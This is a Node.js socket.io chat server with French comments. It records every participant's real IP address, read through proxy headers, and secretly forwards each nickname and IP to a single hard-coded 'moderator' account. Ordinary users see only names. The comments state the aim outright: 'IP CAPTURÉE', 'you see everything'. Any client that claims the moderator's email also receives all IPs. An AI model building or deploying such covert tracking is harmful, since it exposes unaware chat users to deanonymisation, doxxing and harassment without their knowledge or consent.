const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: "*" } });

app.use(express.static(__dirname));

let users = [];
const MODO_EMAIL = "toucheur2pp@heaven.com";

io.on('connection', (socket) => {
    // Extraction de l'IP réelle même derrière Render
    let ip = socket.handshake.headers['x-forwarded-for'] || socket.request.connection.remoteAddress;
    if (ip.includes(',')) ip = ip.split(',')[0];
    ip = ip.replace('::ffff:', '').trim();

    socket.on('init', (data) => {
        const u = { id: socket.id, n: data.n, e: data.e, ip: ip };
        users.push(u);

        // On prévient le Modo (toi) qu'une nouvelle IP est capturée
        const boss = users.find(user => user.e === MODO_EMAIL);
        if (boss && u.e !== MODO_EMAIL) {
            io.to(boss.id).emit('chat', { n: "SYSTEM", t: { t: `🎯 IP CAPTURÉE : ${u.n} -> ${u.ip}`, type: 'intel' } });
        }
        updateAll();
    });

    socket.on('chat', (data) => {
        const sender = users.find(u => u.id === socket.id);
        if (sender) io.emit('chat', { n: sender.n, t: data });
    });

    socket.on('disconnect', () => {
        users = users.filter(u => u.id !== socket.id);
        updateAll();
    });

    function updateAll() {
        const boss = users.find(u => u.e === MODO_EMAIL);
        if (boss) io.to(boss.id).emit('sync', users); // Toi tu vois tout (avec IP)
        io.emit('sync', users.map(u => ({ id: u.id, n: u.n }))); // Eux voient juste les noms
    }
});

server.listen(process.env.PORT || 3000, '0.0.0.0');
